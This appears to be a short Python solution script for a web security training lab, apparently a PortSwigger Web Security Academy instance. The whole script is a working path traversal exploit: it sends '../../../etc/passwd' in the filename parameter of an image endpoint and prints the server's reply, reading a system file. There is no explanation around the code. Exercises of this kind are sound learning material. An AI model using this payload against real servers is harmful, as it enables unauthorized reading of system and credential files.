import requests

payload = "../../../etc/passwd"
url = "https://acc61f2c1e641833c021430100060072.web-security-academy.net/image?filename=" + payload

response = requests.get(url)

print(response.text)
